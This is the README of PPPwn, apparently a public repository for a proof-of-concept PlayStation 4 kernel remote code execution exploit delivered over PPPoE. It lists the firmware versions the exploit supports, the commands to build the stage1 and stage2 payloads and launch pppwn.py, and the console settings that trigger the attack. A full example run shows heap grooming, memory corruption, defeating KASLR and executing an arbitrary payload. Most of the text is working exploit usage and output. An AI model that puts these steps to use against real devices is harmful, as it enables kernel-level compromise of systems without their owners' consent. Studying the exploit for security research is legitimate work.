# PPPwn - PlayStation 4 PPPoE RCE
PPPwn is a kernel remote code execution exploit for PlayStation 4 up to FW 11.00. This is a proof-of-concept exploit for [CVE-2006-4304](https://hackerone.com/reports/2177925) that was reported responsibly to PlayStation.

Supported versions are:
- FW 7.50 / 7.51 / 7.55
- FW 8.00 / 8.01 / 8.03
- FW 8.50 / 8.52
- FW 9.00
- FW 9.03 / 9.04
- FW 9.50 / 9.51 / 9.60
- FW 10.00 / 10.01
- FW 10.50 / 10.70 / 10.71
- FW 11.00
- more can be added (PRs are welcome)

The exploit only prints `PPPwned` on your PS4 as a proof-of-concept. In order to launch Mira or similar homebrew enablers, the `stage2.bin` payload needs to be adapted.

## Requirements
- A computer with an Ethernet port
  - USB adapter also works
- Ethernet cable
- Linux
  - You can use VirtualBox to create a Linux VM with `Bridged Adapter` as network adapter to use the ethernet port in the VM.
- Python3 and gcc installed

## Usage

On your computer, clone the repository:

```sh
git clone --recursive https://github.com/TheOfficialFloW/PPPwn
```

Change the directory to the cloned repository:

```sh
cd PPPwn
```

Install the requirements:

```sh
sudo pip install -r requirements.txt
```

Compile the payloads:

```sh
make -C stage1 FW=1100 clean && make -C stage1 FW=1100
make -C stage2 FW=1100 clean && make -C stage2 FW=1100
```

For other firmwares, e.g. FW 9.00, pass `FW=900`.

DO NOT RUN the exploit just yet (don't press Enter yet) but prepare this command on your prompt (see `ifconfig` for the correct interface):

```sh
sudo python3 pppwn.py --interface=enp0s3 --fw=1100
```

For other firmwares, e.g. FW 9.00, pass `--fw=900`.

On your PS4:

- Go to `Settings` and then `Network`
- Select `Set Up Internet connection` and choose `Use a LAN Cable`
- Choose `Custom` setup and choose `PPPoE` for `IP Address Settings`
- Enter anything for `PPPoE User ID` and `PPPoE Password`
- Choose `Automatic` for `DNS Settings` and `MTU Settings`
- Choose `Do Not Use` for `Proxy Server`

- Now, simultaneously press the 'X' button on your controller on `Test Internet Connection` and 'Enter' on your keyboard (on the computer you have your Python script ready to run).

ALWAYS wait for you console to show the message "Cannot connect to network: (NW-31274-7)" before trying this PPOE injection again.

If the exploit fails or the PS4 crashes, you can skip the internet setup and simply click on `Test Internet Connection`. Kill the `pppwn.py` script and run it again on your computer, and then click on `Test Internet Connection` on your PS4: always simultaneously.


If the exploit works, you should see an output similar to below, and you should see `Cannot connect to network.` followed by `PPPwned` printed on your PS4, or the other way around. 

### Example run

```sh
[+] PPPwn - PlayStation 4 PPPoE RCE by theflow
[+] args: interface=enp0s3 fw=1100 stage1=stage1/stage1.bin stage2=stage2/stage2.bin

[+] STAGE 0: Initialization
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 07:ba:be:34:d6:ab
[+] AC cookie length: 0x4e0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[*] Waiting for interface to be ready...
[+] Target IPv6: fe80::2d9:d1ff:febc:83e4
[+] Heap grooming...done

[+] STAGE 1: Memory corruption
[+] Pinning to CPU 0...done
[*] Sending malicious LCP configure request...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[+] Scanning for corrupted object...found fe80::0fdf:4141:4141:4141

[+] STAGE 2: KASLR defeat
[*] Defeating KASLR...
[+] pppoe_softc_list: 0xffffffff884de578
[+] kaslr_offset: 0x3ffc000

[+] STAGE 3: Remote code execution
[*] Sending LCP terminate request...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 97:df:ea:86:ff:ff
[+] AC cookie length: 0x511
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Triggering code execution...
[*] Waiting for stage1 to resume...
[*] Sending PADT...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634be9200
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] AC cookie length: 0x0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...

[+] STAGE 4: Arbitrary payload execution
[*] Sending stage2 payload...
[+] Done!
```

## Notes for Mac Apple Silicon Users (arm64 / aarch64)
The code will not compile on Apple Silicon and requires AMD64 architecture.
There is a workaround using docker which will build the bin files required.
Clone this repository to your mac system, then from the repo folder run `./build-macarm.sh`.This will build the binaries for PS4 FW 1100 and place the necessary files into the correct folders. To build the binaries for a different version, i.e. 900, run the command as such: `./build-macarm.sh 900`. Once built, copy this folder structure into the Linux VM and execute as instructed above.
This has been tested using VMware Fusion 13.5.1, with the VM Guest as Ubuntu 24.04, and the host machine is MacOS 14.4.1
